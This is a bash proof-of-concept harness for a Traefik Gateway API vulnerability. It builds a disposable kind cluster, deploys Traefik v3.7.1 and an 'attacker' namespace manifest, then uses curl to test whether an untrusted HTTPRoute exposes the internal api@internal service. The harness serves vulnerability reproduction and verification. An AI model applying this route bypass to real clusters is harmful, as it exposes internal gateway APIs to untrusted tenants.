#!/usr/bin/env bash
set -euo pipefail

cluster_name="cve-2026-54761"
poc_dir="/opt/poc"
gateway_api_version="v1.5.0"

cleanup() {
    if [ "${KEEP_CLUSTER:-0}" = "1" ]; then
        echo "[*] KEEP_CLUSTER=1, leaving the kind cluster running"
        return
    fi
    echo "[*] Deleting the disposable kind cluster"
    kind delete cluster --name "${cluster_name}" >/dev/null 2>&1 || true
}

trap cleanup EXIT

echo "[*] Waiting for the nested Docker daemon"
for _ in $(seq 1 60); do
    if docker info >/dev/null 2>&1; then
        break
    fi
    sleep 1
done
docker info >/dev/null

kind delete cluster --name "${cluster_name}" >/dev/null 2>&1 || true
echo "[*] Creating a disposable kind cluster"
kind create cluster --name "${cluster_name}" --config "${poc_dir}/kind-config.yaml"

echo "[*] Loading the vulnerable application images"
docker pull traefik:v3.7.1
docker pull traefik/whoami:v1.11.0
kind load docker-image --name "${cluster_name}" traefik:v3.7.1 traefik/whoami:v1.11.0

echo "[*] Installing Gateway API CRDs"
kubectl apply --server-side \
    -f "https://github.com/kubernetes-sigs/gateway-api/releases/download/${gateway_api_version}/experimental-install.yaml"

kubectl apply -f "${poc_dir}/traefik-v371.yaml"
kubectl wait -n traefik --for=condition=available deployment/traefik --timeout=180s
kubectl apply -f "${poc_dir}/gateway-exploit.yaml"
kubectl wait -n attacker --for=condition=available deployment/whoami --timeout=180s

echo "[*] Waiting for Traefik to process the routes"
sleep 10

control_status="$(curl -sS -o /dev/null -w '%{http_code}' \
    -H 'Host: control.localhost' http://127.0.0.1:18080/api/http/services)"
echo "Control route status: ${control_status}"

exploit_body=""
for _ in $(seq 1 60); do
    exploit_body="$(curl -sS -H 'Host: exploit.localhost' \
        http://127.0.0.1:18080/api/http/services || true)"
    if printf '%s' "${exploit_body}" | grep -q 'api@internal'; then
        break
    fi
    sleep 2
done

if [ "${control_status}" = "404" ] && printf '%s' "${exploit_body}" | grep -q 'api@internal'; then
    echo "[+] VULNERABLE: an untrusted HTTPRoute exposed api@internal."
    exit 0
fi

echo "[-] The bypass was not reproduced."
printf '%s\n' "${exploit_body}"
kubectl get httproute -n attacker -o yaml
kubectl logs -n traefik deployment/traefik
exit 1

